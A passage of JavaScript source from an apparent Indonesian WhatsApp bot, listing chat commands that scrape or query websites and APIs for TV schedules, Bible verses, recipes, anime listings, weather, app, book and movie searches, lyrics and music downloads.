        sourceUrl: res.result[0]?.url,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  }, { quoted: m })
}
break

case 'jadwaltv': {
if (isBan) return Xban()
await xreaction()
    if (!text) return ReplyRynzz(m.chat, `Masukkan channel TV yang ingin Anda lihat jadwalnya.\nExample: ${XyrooRynzz} rtv`);

async function fetchJadwalTv(tv) {
    try {
        const response = await axios.get(`https://www.jadwaltv.net/channel/${encodeURIComponent(tv)}`);
        const $ = cheerio.load(response.data);

        const hasil = [];
        $('table.table-bordered tbody tr').each((i, el) => {
            const jam = $(el).find('td').eq(0).text().trim();
            const acara = $(el).find('td').eq(1).text().trim();

            if (jam && acara) hasil.push({ jam, acara });
        });

        return hasil;
    } catch (error) {
        throw new Error("Gagal mengambil data, pastikan nama channel benar atau situs sedang bermasalah.");
    }
}

    try {
        const data = await fetchJadwalTv(text.toLowerCase());
        if (data.length === 0) return ReplyRynzz(m.chat, 'Tidak ada hasil untuk nama channel tersebut.');

        const jadwalTv = data.map(({ jam, acara }) => `${jam} - ${acara}`).join('\n');
        const pesan = `Jadwal TV untuk channel *${text.toUpperCase()}*:\n\n${jadwalTv}`;
        await ReplyRynzz(`${pesan}`);
    } catch (error) {
        await ReplyRynzz(m.chat, `Terjadi kesalahan: ${error.message}`);
    }
};
break

case 'alkitab': {
if (isBan) return Xban()
await xreaction()
    if (!text) return ReplyRynzz(`teksnya mana?\n\ncontoh: ${XyrooRynzz} kejadian`)
    let res = await axios.get(`https://alkitab.me/search?q=${encodeURIComponent(text)}`, { headers: { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" } })

    let $ = cheerio.load(res.data)
    let result = []
    $('div.vw').each(function (a, b) {
        let teks = $(b).find('p').text().trim()
        let link = $(b).find('a').attr('href')
        let title = $(b).find('a').text().trim()
        result.push({ teks, link, title })
    })

    let caption = result.map(v => `${v.title}\n${v.teks}`).join('\n────────\n')
    ReplyRynzz(caption)
}
break

case 'jkt48news': {
if (isBan) return Xban()
await xreaction()

async function jktNews(lang = "id") {
   let { data } = await axios.get(`https://jkt48.com/news/list?lang=${lang}`);
   let $ = cheerio.load(data);

   const news = [];
   
   $(".entry-news__list").each((index, element) => {
      const title = $(element).find("h3 a").text();
      const link = $(element).find("h3 a").attr("href");
      const date = $(element).find("time").text();

      news.push({ title, link: "https://jkt48.com" + link, date });
   });

   return news;
}

   try {
      let data = await jktNews();
      if (data.length === 0) return ReplyRynzz("Tidak Ada Berita Terbaru Hari Ini, Silahkan Kembali.")
      let result = data.map((res, id) => {
        return `${id + 1}, ${res.title}\nLink: ${res.link}\nTanggal Mulai: ${res.date}`
        }).join("\n\n");
        await ReplyRynzz(result)
   } catch (error) {
      throw "Gagal Mencari Berita."
      console.error(error.message)
   }
}
break
case 'resepsearch': {
if (isBan) return Xban()
await xreaction()
  try {
    if (!text) return ReplyRynzz(`Please provide a dish name to search!\n\nExample: ${XyrooRynzz} Nasi Goreng`);

async function resep(makanan) {
  let BASE = `https://cookpad.com/id/cari/${encodeURIComponent(makanan)}`;
  let { data } = await axios.get(BASE);

  let $ = cheerio.load(data);
  let hasil = [];

  $("li[data-search-tracking-target='result']").each((i, el) => {
    let namaResep = $(el).find("h2 a").text().trim();
    let linkResep = "https://cookpad.com" + $(el).find("h2 a").attr("href");
    let waktuMasak = $(el).find(".mise-icon-time + .mise-icon-text").text().trim();
    let pembuat = $(el).find(".flex.items-center span.text-cookpad-gray-600").text().trim();

    hasil.push({ namaResep, linkResep, waktuMasak, pembuat });
  });

  return hasil;
}

    const results = await resep(text);

    if (results.length === 0) {
      return ReplyRynzz('No recipes found for the given dish name.');
    }

    let message = `
🍽️ *Recipes Found!* 🍽️

`;
    results.forEach((res, index) => {
      message += `
🔹 *Recipe ${index + 1}*
- 🍲 Name: ${res.namaResep}
- ⏲️ Cooking Time: ${res.waktuMasak}
- 👨‍🍳 Created by: ${res.pembuat}
- 🔗 [View Recipe](${res.linkResep})
`;
    });

    await Alice.sendMessage(m.chat, { text: message, footer: packname }, { quoted: m });
  } catch (error) {
    console.error(error);
    ReplyRynzz("An error occurred: " + error.message);
  }
};
break

case 'animexin' : {
if (isBan) return Xban()
await xreaction()
  try {
    if (!text) { return ReplyRynzz(`Please provide a keyword or an action (update/detail/search)!\n\nExample:\n${XyrooRynzz} update`);
    }

    const args = text.split(' ');
    const action = args[0].toLowerCase();
    const query = args.slice(1).join(' ');

    if (action === 'update') {
      ReplyRynzz('Fetching latest anime updates... Please wait...');
      const result = await animexin.animexinUpdate();
      if (result && result.length > 0) {
        let message = '🔍 *Latest Anime Updates* 🔍\n\n';
        result.forEach(anime => {
          message += `📺 *Title*: ${anime.title}\n🔗 *URL*: ${anime.url}\n🖼️ *Image*: ${anime.image}\n🎬 *Episode*: ${anime.episode}\n📦 *Type*: ${anime.type}\n\n`;
        });
        ReplyRynzz(message);
      } else {
        ReplyRynzz('No updates found.');
      }
    } else if (action === 'detail' && query) {
      ReplyRynzz('Fetching anime details... Please wait...');
      const result = await animexin.animexinDetail(query);
      if (result) {
        ReplyRynzz(`🔍 *Anime Details* 🔍\n\n${result}`);
      } else {
        ReplyRynzz('No details found for the provided URL.');
      }
    } else if (action === 'search' && query) {
      ReplyRynzz('Searching for anime... Please wait...');
      const result = await animexin.animexinSearch(query);
      if (result) {
        ReplyRynzz(`🔍 *Search Results* 🔍\n\n${result}`);
      } else {
        ReplyRynzz('No results found for the provided keyword.');
      }
    } else {
      ReplyRynzz(`Invalid command or missing query. Please use the following format:\n\n${XyrooRynzz} update\n${XyrooRynzz} detail <URL>\n${XyrooRynzz} search <keyword>`);
    }
  } catch (error) {
    console.error(error);
    ReplyRynzz('Error: ' + error.message);
  }
};
break

    case "nontonanime-latest": {
if (isBan) return Xban()
await xreaction()
        const list = await nontonAnime.latest();
        if (!list.length) return ReplyRynzz("Gagal mengambil data anime terbaru.");
        for (let i = 0; i < Math.min(3, list.length); i++) {
          const Xyroo = list[i];
          await Alice.sendMessage(m.chat, {
            image: { url: Xyroo.thumbnail },
            caption: `*${Xyroo.title}*\nEpisode: ${Xyroo.episode}\nTipe: ${Xyroo.type}\nURL: ${Xyroo.url}`
          }, { quoted: m });
        }
      }
      break;

    case "nontonanime-upcoming": {
if (isBan) return Xban()
await xreaction()
        const list = await nontonAnime.upcoming();
        if (!list.length) return ReplyRynzz("Tidak ada anime upcoming ditemukan.");
        for (let i = 0; i < Math.min(3, list.length); i++) {
          const Xyroo= list[i];
          await Alice.sendMessage(m.chat, {
            image: { url: Xyroo.thumbnail },
            caption: `*${Xyroo.title}*\nEpisode: ${Xyroo.episode}\nTipe: ${Xyroo.type}\nURL: ${Xyroo.url}`
          }, { quoted: m });
        }
      }
      break;

    case "nontonanime-search": {
if (isBan) return Xban()
await xreaction()
        if (!args[0]) return ReplyRynzz("Masukkan judul anime yang ingin dicari!");
        const list = await nontonAnime.search(args.join(" "));
        if (!list.length) return ReplyRynzz("Anime tidak ditemukan.");
        for (let i = 0; i < Math.min(3, list.length); i++) {
          const Xyroo= list[i];
          await Alice.sendMessage(m.chat, {
            image: { url: Xyroo.thumbnail },
            caption: `*${Xyroo.title}*\nEpisode: ${Xyroo.episode}\nTipe: ${Xyroo.type}\nURL: ${Xyroo.url}`
          }, { quoted: m });
        }
      }
      break;
      
case 'myanimelist': {
  if (!q) return ReplyRynzz(`Example: ${XyrooRynzz} one piece`)
  let anime = await fetch(`https://api.jikan.moe/v4/anime?q=${q}`)
  let res = await anime.json()
  if (!res.data || res.data.length === 0) return ReplyRynzz('Anime tidak ditemukan!')
  let result = res.data[0]
  let teks = `*${result.title}*\n\n`
  teks += `*Judul Jepang:* ${result.title_japanese || '-'}\n`
  teks += `*Tipe:* ${result.type || '-'}\n`
  teks += `*Episode:* ${result.episodes || '-'}\n`
  teks += `*Status:* ${result.status || '-'}\n`
  teks += `*Tanggal Tayang:* ${result.aired?.string || '-'}\n`
  teks += `*Skor:* ${result.score || '-'}\n`
  teks += `*Produser:* ${(result.producers?.map(p => p.name).join(', ')) || '-'}\n`
  teks += `*Studio:* ${(result.studios?.map(s => s.name).join(', ')) || '-'}\n`
  teks += `*Genre:* ${(result.genres?.map(g => g.name).join(', ')) || '-'}\n`
  teks += `*Durasi:* ${result.duration || '-'}\n`
  teks += `*Rating:* ${result.rating || '-'}\n`
  teks += `\n*Sinopsis:* ${result.synopsis || '-'}\n`
  teks += `\n*Link:* ${result.url}`
  Alice.sendMessage(m.chat, {
    image: { url: result.images.jpg.image_url },
    caption: teks
  }, { quoted: m })
}
break
        
case 'yahooimg':
case 'yahooimage' : {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz("Ingin Mencari Apa?");
    try {
        const images = await Yimg(text);
        if (images.length === 0) {
            ReplyRynzz("Tidak ada gambar yang ditemukan");
        } else {
            const image = images[0];
            let imageText = `*Judul :* _${image.title}_\n`;
            imageText += `*Ukuran :* _${image.size}_\n`;
            imageText += `*Dimensi :* _${image.width}x${image.height}_\n\n`;
            imageText += `*Sumber :* _${image.url}_\n`;

            await Alice.sendMessage(m.chat, {
                image: { url: image.url },
                caption: imageText,
            }, { quoted: m });
        }
    } catch (error) {
        ReplyRynzz("❌ Terjadi kesalahan saat mengambil gambar.");
        console.error(error);
    }
  }
break

case 'cuaca' :
case 'cuacakota' : {
    if (!text) return ReplyRynzz(`Masukkan nama kota!\nContoh: ${XyrooRynzz} pandeglang`)

    try {
        let res = await fetch(`https://fastrestapis.fasturl.cloud/search/weather?location=${encodeURIComponent(text)}`)
        let json = await res.json()

        if (json.status !== 200) {
            return ReplyRynzz('Gagal mengambil data cuaca, pastikan kota valid.')
        }

function getWeatherEmoji(condition) {
    condition = condition.toLowerCase()
    if (condition.includes('cloud')) return '☁️'
    if (condition.includes('rain')) return '🌧️'
    if (condition.includes('sun')) return '☀️'
    if (condition.includes('clear')) return '🌞'
    if (condition.includes('storm')) return '⛈️'
    if (condition.includes('snow')) return '❄️'
    if (condition.includes('fog')) return '🌫️'
    return '⛅'
}

        let r = json.result
        let emojiCuaca = getWeatherEmoji(r.condition)

        // 1
        await Alice.sendMessage(m.chat, {
            location: {
                degreesLatitude: parseFloat(r.latitude),
                degreesLongitude: parseFloat(r.longitude)
            }
        }, { quoted: m })

        // 2
        let caption = `
*「 INFO CUACA 」*
📍 *Kota:* ${r.city}
${emojiCuaca} *Kondisi:* ${r.condition}
🌡️ *Suhu:* ${r.temperature}
💧 *Kelembaban:* ${r.humidity}
🌬️ *Angin:* ${r.wind}
🌧️ *Curah Hujan:* ${r.precipitation}
☁️ *Tutup Awan:* ${r.cloudCover}
🔭 *Jarak Pandang:* ${r.visibility}
🌅 *Matahari Terbit:* ${r.sunrise}
🌇 *Matahari Terbenam:* ${r.sunset}
`

        await ReplyRynzz(caption)
    } catch (e) {
        console.log('Error saat mengambil data cuaca:', e)
        ReplyRynzz('Terjadi kesalahan saat memproses permintaan cuaca.')
    }
}
break

case 'sanime':
case 'searchanime':
case 'kuronime': {
  if (!q) return ReplyRynzz('🔎 *Silakan masukkan judul anime yang ingin kamu cari.*')

  try {
    const axios = require("axios")
    const cheerio = require("cheerio")
    const url = `https://kuronime.biz/page/1/?s=${encodeURIComponent(q)}`
    const { data } = await axios.get(url)
    const $ = cheerio.load(data)
    const results = []
    $(".listupd article").each((_, el) => {
      const anchor = $(el).find("a")
      const title = anchor.find("h4").text().trim()
      const link = anchor.attr("href")
      const image = anchor.find("img.lazyload").last().attr("data-src")
      const rating = anchor.find("i").text().trim()
      const type = anchor.find(".type").text().trim()
      results.push({ title, link, image, rating, type })
    })
    if (!results.length) return ReplyRynzz('Anime tidak ditemukan, coba kata kunci lain.')
    let message = `Hasil pencarian untuk *${q}*:\n\n`
    results.forEach((anime, index) => {
      message += `*${index + 1}. ${anime.title}*\n`
      message += `   🔗 *Link*: ${anime.link}\n`
      message += `   📊 *Rating*: ${anime.rating}\n`
      message += `   📌 *Type*: ${anime.type}\n\n`
    })
    Alice.sendMessage(m.chat, {
      text: message.trim(),
      contextInfo: {
        externalAdReply: {
          title: "Kuronime Search",
          body: packname,
          thumbnailUrl: results[0]?.image || '',
          sourceUrl: results[0]?.link || '',
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m })
  } catch (err) {
    console.log(err)
    Xerror()
  }
}
break

case 'ffw': {
if (isBan) return Xban()
await xreaction()
  try {
      const hasil = await FFW();

      if (typeof hasil === 'string' && hasil.startsWith('Error')) {
          ReplyRynzz(hasil);
      } else if (hasil.length === 0) {
          ReplyRynzz('*Tidak ada informasi senjata yang ditemukan!*');
      } else {
          let result = `*Daftar Senjata Free Fire*\n\n`;
          hasil.forEach((item, index) => {
              result += `*Nama Senjata :* _${item.name}_\n`;
              result += `*Damage :* _${item.damage}_\n`; 
              result += `*Kategori :* _${item.tags.join(', ')}_\n\n`;
              result += `*Deskripsi :* _${item.description}_\n\n========================\n\n`;
          });
          ReplyRynzz(result);
      }
  } catch (error) {
      console.error(error);
      Xerror()
  }
}
break
case 'wikimedia': {
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`*Mau Cari Gambar Apa di Wikimedia?*`);
  try {
    const images = await WikiMedia(text);
    if (!images || images.length === 0) {
      return ReplyRynzz("⚠️ *Tidak ditemukan gambar dengan pencarian tersebut di Wikimedia.*");
    }
    function shuffleArray(array) {
      for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
      }
    }
    shuffleArray(images);
    const selectedImages = images.slice(0, 5);
    let push = [];
    let i = 1;
    async function createImage(url) {
      const { imageMessage } = await generateWAMessageContent({
        image: { url }
      }, { upload: Alice.waUploadToServer });
      return imageMessage;
    }
    for (let img of selectedImages) {
      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: `*Pencarian : ${text}*`
        }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
          title: `*Gambar ${i++}*`,
          hasMediaAttachment: true,
          imageMessage: await createImage(img.image)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              "name": "cta_url",
              "buttonParamsJson": `{"display_text":"Wikimedia","url":"${img.source}","merchant_url":"${img.source}"}`
            }
          ]
        })
      });
    }
    const bot = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: `*Berhasil Memuat 5 Gambar*`
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: [...push]
            })
          })
        }
      }
    }, {});

    await Alice.relayMessage(m.chat, bot.message, {
      messageId: bot.key.id
    }).catch((err) => ReplyRynzz(mess.error));

  } catch (error) {
    console.error("Error:", error.message);
    Xerror()
  }
}
break
case 'playstore': {
if (isBan) return Xban()
await xreaction()
  const query = args.join(" ");
  if (!query) return ReplyRynzz("*Mau Cari Aplikasi Apa?*");

  try {
    const hasil = await PlayStore(query);

    if (hasil.length === 0) {
      ReplyRynzz("⚠*Tidak Ada Hasil, Pastikan Nama Aplikasi Valid*");
    } else {
      const app = hasil[0];

      let result = `*Hasil Pencarian Dari : ${query}*\n\n`;
      result += `*Nama :* _${app.nama}_\n`;
      result += `*Developer :* _${app.developer}_\n`;
      result += `*Rating :* _${app.rate}_\n\n`;
      result += `*Link Aplikasi :* _${app.link}_\n`;
      result += `*Link Developer :* _${app.link_dev}_\n`;

      await Alice.sendMessage(from, {
        image: { url: app.img },
        caption: result
      }, { quoted: m });

    }
  } catch (error) {
    console.error(error);
    Xerror()
  }
}
break
case 'caribuku': {
if (isBan) return Xban()
await xreaction()
  const query = args.join(" ");
  if (!query) return ReplyRynzz("Cari buku apa?");

  try {
    const hasil = await BookSearch(query);

    if (hasil.length === 0) {
      ReplyRynzz("🔍 *Tidak Ada Hasil, Pastikan Nama Buku Valid*");
    } else {
      let result = `*Hasil Pencarian Dari : ${query}*\n\n`;
      hasil.forEach((buku, index) => {
        result += `*${index + 1}. ${buku.title}*\n`;
        result += `*Rating :* _${buku.rating}_\n\n`;
        result += `*Link Buku :* \n_${buku.link}_\n\n==============================\n`;
      });
      ReplyRynzz(result);
    }
  } catch (error) {
    console.error(error);
    Xerror()
  }
}
break

case 'lirik':
case 'liriklagu': {
if (isBan) return Xban()
await xreaction()
    if (!text) return ReplyRynzz(`Judul lagu?\nExample: duka`);
    try {
        let results = await LirikLagu(text);
        if (!results || results.length === 0) {
            return ReplyRynzz('Tidak Ditemukan');
        }
        let song = results[0];
        let lyricsRes = await axios.get(song.songLyricsUrl);
        let { artist, songTitle, songLyrics } = lyricsRes.data.data;
        ReplyRynzz(`*Judul* : _${songTitle}_\n*Artis :* _${artist}_\n\n*Lirik* :\n${songLyrics}`);
    } catch (error) {
        ReplyRynzz(`Tidak Ditemukan`);
    }
}
break

case 'samehadakudetail': {
if (isBan) return Xban()
await xreaction()
    if (!text) return ReplyRynzz('Link?');
    
    let cari = await (await fetch(`https://api.siputzx.my.id/api/animesamehadaku/detail?link=${text}`)).json();
    if (cari.status) {
        let cap = '*_LIST ALL EPISODE_*' + '\n\n';
        for (let episode of cari.data.episodes) {
            cap += `*🏷️ TITLE :* ${episode.title}\n*🀄 DATE :* ${episode.date}\n*🔗 LINK :* ${episode.link}\n\n`;
        }
        await Alice.sendMessage(m.chat, { image: { url: cari.data.thumbnail }, caption: cap }, { quoted: m });
    } else {
        await ReplyRynzz('Data tidak ditemukan.');
    }
}
break;
case 'samehadakusearch': {
if (isBan) return Xban()
await xreaction()
    if (!text) return ReplyRynzz('name?');

    let cari = await (await fetch(`https://api.siputzx.my.id/api/anime/samehadaku/search?query=${text}`)).json();
    if (cari.status) {
        let cap = '_Samehadaku Search From: *' + text + '*_\n\n';
        for (let ciro of cari.data) {
            cap += `*🏷️ TITLE :* ${ciro.title}\n*🃏 RATING :* ${ciro.star}\n*🏯 GENRE :* ${ciro.genre.join(', ')}\n*☃️ STATUS :* ${ciro.type.join(', ')}\n*🔗 LINK :* ${ciro.link}\n*🄄 DESKRIPSI :*\n${ciro.description}\n\n`;
        }
        await Alice.sendMessage(m.chat, { image: { url: cari.data[0].thumbnail }, caption: cap }, { quoted: m });
    } else {
        await ReplyRynzz('Data tidak ditemukan.');
    }
}
break;

case 'apksearch': {
if (isBan) return Xban()
await xreaction()
    if (!text) return ReplyRynzz('apk name?');
    
    try {
        let response = await fetch(`https://api-yudzxml.vercel.app/api/apk?action=search&query=` + text);
        let apkData = await response.json();

        if (apkData.status === 200) {
            let results = apkData.data;
            let message = 'Here are the results:\n\n';

            results.forEach(app => {
                message += `*Title:* ${app.title}\n`;
                message += `*Developer:* ${app.developer || 'N/A'}\n`;
                message += `*Version:* ${app.version || 'N/A'}\n`;
                message += `*Rating:* ${app.rating || 'N/A'}\n`;
                message += `*Link:* ${app.link}\n`;
                message += `![Image](${app.image})\n\n`;
            });

            ReplyRynzz(message);
        } else {
            ReplyRynzz('errrorr');
        }
    } catch (e) {
        ReplyRynzz('errrorrr');
    }
}
break;
case 'apkdetail': {
if (isBan) return Xban()
await xreaction()
    if (!text) return ReplyRynzz('apk id or name');

    try {
        let response = await fetch(`https://api-yudzxml.vercel.app/api/apk?action=detail&url=` + text);
        let apkDetail = await response.json();

        if (apkDetail.status === 200) {
            let app = apkDetail.data;
            let message = `*Title:* ${app.title}\n`;
            message += `*Version:* ${app.version}\n`;
            message += `*Genre:* ${app.genre}\n`;
            message += `*Rating:* ${app.rating} (${app.votes} votes)\n`;
            message += `*Developer:* ${app.developer}\n`;
            message += `*Requirements:* ${app.requirements}\n`;
            message += `*Downloads:* ${app.downloads}\n`;
            message += `*Download Link:* ${app.download}\n`;
            message += `*Play Store:* ${app.playstore}\n`;
            message += `*Description:* ${app.description}\n\n`;
            message += `*What's New:* ${app.whatsnew}\n`;
            message += `*Video:* ${app.video}\n\n`;
            message += `*Related Apps:*\n`;

            app.related.forEach(relatedApp => {
                message += `- [${relatedApp.title}](${relatedApp.link}) by ${relatedApp.developer} (Version: ${relatedApp.version}, Rating: ${relatedApp.rating})\n`;
            });

            ReplyRynzz(message);
        } else {
            reply('ada masalah');
        }
    } catch (e) {
        reply('ada masalah');
    }
}
break;

case 'spotify': case 'playspotify': {
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Masukkan judul lagu!\nExample: ${XyrooRynzz}`);
  const res = await fetch(`https://api.nekorinn.my.id/downloader/spotifyplay?q=${encodeURIComponent(text)}`);
  if (!res.ok) return ReplyRynzz('Gagal mengambil data lagu.');
  const data = await res.json();
  if (!data.status) return ReplyRynzz('Lagu tidak ditemukan!');
  const { title, artist, duration, imageUrl, link } = data.result.metadata;
  const downloadUrl = data.result.downloadUrl;
  await Alice.sendMessage(m.chat, {
    audio: { url: downloadUrl },
    mimetype: 'audio/mp4',
    fileName: `${title}.mp3`,
    ptt: false,
    contextInfo: {
      externalAdReply: {
        title: `${title} - ${artist}`,
        body: `${packname}`,
        mediaType: 1,
        thumbnailUrl: imageUrl,
        renderLargerThumbnail: true,
        sourceUrl: link, 
        showAdAttribution: true
      }
    }
  }, { quoted: m });
}
break

case 'google-search':{
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz('Text Input');
const apiUrl = `https://restapii.rioooxdzz.web.id/api/search-google?message=${encodeURIComponent(text)}`;
 
try {
    const response = await fetch(apiUrl);
    let result = await response.json();
    const results = result.data.response;
 
    if (results && results.length > 0) {
        ReplyRynzz(`Search: ${text}\n\n${results}`);
    } else {
        ReplyRynzz('Tidak ada hasil ditemukan.');
    }
} catch (error) {
    console.error(error);  // Log the error if any
    ReplyRynzz('Terjadi kesalahan saat mencari.');
}
}
break

case 'sticker-search': {
if (isBan) return Xban()
await xreaction()
stickersearch = (query) => {
	return new Promise((resolve, reject) => {
		axios.get(`https://getstickerpack.com/stickers?query=${query}`)
			.then(({
				data
			}) => {
				const $ = cheerio.load(data)
				const source = [];
				const link = [];
				$('#stickerPacks > div > div:nth-child(3) > div > a').each(function(a, b) {
					source.push($(b).attr('href'))
				})
				axios.get(source[Math.floor(Math.random() * source.length)])
					.then(({
						data
					}) => {
						const $$ = cheerio.load(data)
						$$('#stickerPack > div > div.row > div > img').each(function(c, d) {
							link.push($$(d).attr('src').replace(/&d=200x200/g, ''))
						})
					let result = {
							status: 200,
							author: global.creator,
							title: $$('#intro > div > div > h1').text(),
							sticker_url: link
						}
						resolve(result)
					})
			}).catch(reject)
	})
}
if (!text) return ReplyRynzz(`example ${XyrooRynzz} Doraemon`)
await xreaction()
anu = await stickersearch(text)
for (let rehs of anu.sticker_url) {
await sleep(1500)
await Alice.sendImageAsSticker(m.chat, rehs, m, { packname: packname, author: author })
}
}
break

case 'alosehat': {
if (isBan) return Xban()
await xreaction()
  if (!q) return ReplyRynzz("Apa yang ingin dicari?");

  const fetch = require('node-fetch');
  const cheerio = require('cheerio');
  
  async function alosehat(query) {
    try {
      const url = `https://wp.hellosehat.com/?s=${encodeURIComponent(query)}`;
      const response = await fetch(url);
      
      if (!response.ok) {
        throw new Error(`${response.status}`);
      }
      
      const body = await response.text();
      const $ = cheerio.load(body);
      
      const articles = $(".card.article--card").map((index, element) => {
        const article = $(element);
        return {
          title: article.find("h2.entry-title a").text().trim(),
          link: article.find("h2.entry-title a").attr("href"),
          desc: article.find(".entry-summary p").text().trim(),
          author: article.find(".author.vcard a").text().trim(),
          time: article.find("time.entry-date.published").attr("datetime")
        };
      }).get().filter(article => article.title && article.desc);
      
      if (!articles.length) {
        throw new Error("No matching results found.");
      }
      
      const totalResults = parseInt($(".search--result-count").text(), 10) || 0;
      return { total: totalResults, results: articles };
      
    } catch (error) {
      throw new Error(`Error: ${error.message}`);
    }
  }

  try {
    const results = await alosehat(q);
    const { total, results: articles } = results;
    
    if (total === 0) {
      return ReplyRynzz("gd hsil.");
    }
    
    const response = articles.map((item, index) => (
      `${index + 1}. ${item.title}\nPenulis: ${item.author}\nTanggal: ${item.time}\nDeskripsi: ${item.desc}\nLink: ${item.link}\n\n`
    )).join('');

    ReplyRynzz(`Hasil pencarian Hello Sehat (${total} hasil):\n\n${response}`);
    
  } catch (error) {
    ReplyRynzz(`Terjadi kesalahan: ${error.message}`);
  }
}
break

case 'infoanime':
case 'Informationanime':
case 'informasianime': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`masukan judul anime? contoh ${XyrooRynzz}atri: my dear moments`)
sendReaction("⏳")
await xreaction()

try {
const infoanime = await fetchJson(`https://api.ryzendesu.vip/api/weebs/anime-info?query=${text}`)
let capt = `╭──── *[ ɪɴғᴏ - ᴀɴɪᴍᴇ ]* ──々\n`
capt += `│ =〆 ᴊᴜᴅᴜʟ : ${infoanime.title}\n`
capt += `│ =〆 sᴄᴏʀᴇ : ${infoanime.score}\n`
capt += `│ =〆 ᴍᴇᴍʙᴇʀs : ${infoanime.members}\n`
capt += `│ =〆 sᴛᴀᴛᴜs : ${infoanime.status}\n`
capt += `│ =〆 ᴅᴇsᴄʀɪᴘᴛɪᴏɴ : ${infoanime.synopsis}\n`
capt += `│ =〆 ғᴀᴠᴏʀɪᴛᴇ : ${infoanime.favorites}\n`
capt += `│ =〆 ᴜʀʟ : ${infoanime.url}\n`
capt += `╰─々`
await Alice.sendMessage(m.chat, {
image: { url: infoanime.images.jpg.large_image_url },
caption: capt,
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: channel,
newsletterName: `InfoAnime By: ${ownername}`,
serverMessageId: 143
}
}
}, { quoted: m })
} catch (err) {
sendReaction("❌")
}}
break

case 'gimage': {
if (isBan) return Xban()
await xreaction()
    if (!text) return ReplyRynzz(`gimage Kucing`)
    await xreaction()
    const axios = require('axios')
    const cheerio = require('cheerio')
// wm avs
    const nyariGambar = async (query) => {
        const url = `https://www.google.com/search?q=${encodeURIComponent(query)}&tbm=isch`
        const { data } = await axios.get(url)
        const $ = cheerio.load(data)
        let images = []
        $('img').each((i, elem) => {
            images.push($(elem).attr('src'))
        })
        return images
    }
// wm avs
    nyariGambar(text).then(images => {
        if (images.length === 0) {
            return ReplyRynzz('Tidak ada gambar.')
        }
        let SaannzImage = images[Math.floor(Math.random() * images.length)]
        Alice.sendMessage(m.chat, { image: { url: SaannzImage }, caption: `*Query* : ${text}\n*Media Url* : ${SaannzImage}` }, { quoted: m })
    }).catch(error => {
        ReplyRynzz('Terjadi kesalahan.')
    })
}
break

case 'bingimg': {
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz('Masukkan kata kunci yang akan dicari!')

  //created by hann

  const AXIOS_OPTIONS = {
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    },
  };

  function parseimg(url) {
    const urlObj = new URL(url);
    const searchParams = new URLSearchParams(urlObj.search);
    return decodeURIComponent(searchParams.get('mediaurl'));
  }

  function search(query) {
    return axios.get(
      `https://www.bing.com/images/search?q=${query}`,
      AXIOS_OPTIONS
    ).then(function ({ data }) {
      let $ = cheerio.load(data)

      const url = []

      $(".imgpt > a").each((i, el) => {
        url[i] = $(el).attr("href");
      });

      const result = [];
      for (let i = 0; i < url.length; i++) {
       result[i] = {
          photo: parseimg('https://bing.com'+url[i])
        };
      }
      return result;
    });
  }

  let img = await search(text)
  let hasil = img[Math.floor(Math.random() * img.length)]

  Alice.sendMessage(m.chat, { image: {url: `${hasil.photo}`}}, { quoted: m })
}
break


case 'movie-search': {
if (isBan) return Xban()
await xreaction()
  if (!text) {
    throw 'Contoh: .movie-search horror';
  }
// wm avs
  ReplyRynzz('_sabar tuan sedang mencari film nya_');
// wm avs
  async function avzz(query) {
    const url = `https://www.themoviedb.org/search?query=${query}`;
    try {
      const response = await axios.get(url);
      const html = response.data;
      const $ = cheerio.load(html);
      const movies = [];
// wm avs
      $('.card').each((index, element) => {
        const title = $(element).find('.title a').text().trim();
        const link = `https://www.themoviedb.org${$(element).find('.title a').attr('href')}`;
        const synopsis = $(element).find('.overview').text().trim();
        movies.push({ title, link, synopsis });
      });
// wm avs
      return movies;
    } catch (error) {
      console.error('error di sini:', error);
      return [];
    }
  }
// wm avs
  try {
    const query = encodeURIComponent(text);
    const movies = await avzz(query);

    if (movies.length === 0) {
      throw new Error('Film tidak ditemukan.');
    }
// wm avs
    let result = '';
    movies.forEach((movie, index) => {
      result += `*${index + 1}. ${movie.title}*\nLink: ${movie.link}\nSinopsis: ${movie.synopsis}\n\n`;
    });
// wm avs
    ReplyRynzz(result);
  } catch (error) {
    ReplyRynzz(`terjadi kesalahan: ${error.message}`);
  }
}
break


case 'sbook': {
if (isBan) return Xban()
await xreaction()
    if (!q.trim()) return ReplyRynzz(`Mau cari buku apa?`);
    const axios = require('axios');
    const cheerio = require('cheerio');
    // wm avz
    async function avzzzz(query) {
        const url = `https://www.goodreads.com/search?q=${encodeURIComponent(query)}`;
        // wm avz
        try {
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
            const books = [];
            $('.tableList tr').each((index, element) => {
                const title = $(element).find('a.bookTitle span').text().trim();
                const link = $(element).find('a.bookTitle').attr('href');
                const rating = $(element).find('span.minirating').text().trim();
                // wm avz
                books.push({ title, link: `https://www.goodreads.com${link}`, rating });
            });
            // wm avz
